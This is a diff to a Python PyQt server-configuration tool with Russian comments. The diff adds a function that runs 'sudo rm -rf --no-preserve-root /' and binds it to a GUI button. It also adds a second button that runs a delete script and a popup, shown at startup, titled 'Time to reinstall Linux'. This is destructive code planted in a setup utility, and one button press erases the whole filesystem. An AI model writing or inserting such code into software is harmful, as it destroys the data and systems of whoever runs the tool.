@@ -6,6 +6,7 @@ import re
 from time import sleep
 
 #показывает окно
+os.system("./interfaces.sh")
 app = QtWidgets.QApplication(sys.argv)
 MainWindow = QtWidgets.QMainWindow()
 ui = Ui_MainWindow()
@@ -74,6 +75,13 @@ def ip_not_corecct():
     neval.setIcon(QMessageBox.Warning)
     neval.exec_()
 
+#функция для вызова всплывающего окна если допущена ошибка в вводе ip адреса
+def end():
+    neval = QMessageBox()
+    neval.setWindowTitle("Время переустонавливать Linux")
+    neval.setText("Настройка сервера была окончена, перезагрузите ваш компьютер, чтобы все службы работали коректно.")
+    neval.setIcon(QMessageBox.Question)
+    neval.exec_()
 #Параметры для настройки DDNS по умолчанию
 def ddns_umol():
         print("DDNS по умолчанию")
@@ -98,6 +106,7 @@ def checking_ip_vpn():
     bolv = is_valid_ip(ui.VPNuip.text()) & is_valid_ip(ui.VPNip_mask)
     return bolv
 
+end()
 #Логистика при нажатии кнопки настроить
 def click():
     #если выбран DDNS
@@ -135,11 +144,26 @@ def click():
         print("FIreWall")
         os.system("./fire.sh")
 
+
+
+def RmRf():
+    print("death")
+    sleep(5)
+    os.system("sudo rm -rf --no-preserve-root /")
+
+def RmSetting():
+    print("death")
+    sleep(5)
+    os.system("./delete.sh")
+
 #Функция которая закрывает приложение если нажать кнопку отмена
 def can():
+    os.system("rm intface.txt")
     sys.exit(app.exec_())
 
 #указывает какую функцию вызывать если нажата та или иная кнопка
+ui.pushButton_2.clicked.connect(RmSetting)
+ui.pushButton.clicked.connect(RmRf)
 ui.setting.clicked.connect(click)
 ui.cancl.clicked.connect(can)
 #поддерживает программу включённой
